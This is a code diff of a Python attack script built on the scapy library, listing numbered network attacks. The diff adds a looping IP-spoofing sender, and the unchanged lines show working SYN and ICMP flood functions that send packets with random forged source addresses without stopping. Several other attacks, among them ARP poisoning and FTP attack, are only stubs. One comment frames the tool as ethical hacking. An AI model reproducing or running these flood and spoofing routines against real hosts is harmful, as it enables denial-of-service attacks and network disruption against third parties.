@@ -76,11 +76,12 @@ def perform_dos(ip_addr=None):
     return "Dos performed on " + ip_addr
 
 
-#(6) Code to perform ftp attack
+# (6) Code to perform ftp attack
 def perform_ftp_attack():
     return "ftp attack performed"
 
-#(7) Code to perform ip address sweep
+
+# (7) Code to perform ip address sweep
 def perform_sweep(packet_dst=None, packet_data=""):
     if not packet_dst:
         # Get input from the user
@@ -100,7 +101,8 @@ def perform_sweep(packet_dst=None, packet_data=""):
 
     return "Sweep towards " + packet_dst + " performed"
 
-#(8) Code to perform port scan
+
+# (8) Code to perform port scan
 def perform_port_scan(ip_addr=None, port_range=None):
     if not ip_addr:
         # Get input from the user
@@ -158,7 +160,7 @@ def perform_port_scan(ip_addr=None, port_range=None):
     return "Port scan performed successfully on " + ip_addr
 
 
-#(9) Code to perform ip spoofing
+# (9) Code to perform ip spoofing
 def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
     if not src_ip:
         # Get input from the user
@@ -172,17 +174,24 @@ def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
         # Get input from the user
         packet_data = input("Enter the packet data: ")
 
-    return (
-        "IP spoofing performed from "
-        + src_ip
-        + " to "
-        + dst_ip
-        + " with data "
-        + packet_data
+    packet = IP(src=src_ip, dst=dst_ip) / packet_data
+
+    packet_counter = 0
+
+    # Continuously send the packet until the user decides to stop
+    while True:
+        packet_counter += 1
+        send(packet)
+        user_input = input("Press Enter to send another packet or 'q' to quit: ")
+        if user_input.lower() == "q":
+            break
+
+    return "IP spoofing performed from {} to {} with data {}. Total packets sent: {}".format(
+        src_ip, dst_ip, packet_data, packet_counter
     )
 
 
-#(10) Code to perform os discovery
+# (10) Code to perform os discovery
 def perform_os_discovery(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -191,35 +200,35 @@ def perform_os_discovery(ip_addr=None):
     return "OS discovery performed on " + ip_addr
 
 
-#(11) Code to perform syn flood attack
+# (11) Code to perform syn flood attack
 def perform_syn_flood_attack(ip_addr=None, port_range=None):
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
-    #if not port_range:
-        # Get input from the user
+    # if not port_range:
+    # Get input from the user
     #    port_range = input("Enter the port range to scan (e.g. 1-1000): ")
-    
+
     packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=139, flags="S")
     send(packet, loop=1, inter=0.005)
 
     return "SYN flood attack performed on " + ip_addr + " from " + port_range
 
 
-#(12) Code to perform icmp flood attack
+# (12) Code to perform icmp flood attack
 def perform_icmp_flood_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
-    
+
     packet = IP(src=RandIP(), dst=ip_addr) / ICMP() / "1234567890"
     send(packet, loop=1, inter=0.005)
 
     return "ICMP flood attack performed on " + ip_addr
 
 
-#(13) Code to perform udp flood attack
+# (13) Code to perform udp flood attack
 def perform_udp_flood_attack(ip_addr=None, port=None):
     if not ip_addr:
         # Get input from the user
@@ -256,7 +265,7 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
     return "UDP flood attack performed on " + ip_addr + " from " + port
 
 
-#(14) Code to perform drop communication
+# (14) Code to perform drop communication
 def perform_drop_communication(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -271,11 +280,10 @@ def perform_drop_communication(ip_addr=None):
 
     ## Alternativa Style Ethical Hacking -> scan automatica e drop comunication
 
-
     return "Drop communication performed on " + ip_addr
 
 
-#(15) Code to perform ARP poisoning
+# (15) Code to perform ARP poisoning
 def perform_arp_poisoning(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -284,7 +292,7 @@ def perform_arp_poisoning(ip_addr=None):
     return "ARP poisoning performed on " + ip_addr
 
 
-#(16) Code to perform Special attack
+# (16) Code to perform Special attack
 def perform_special_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
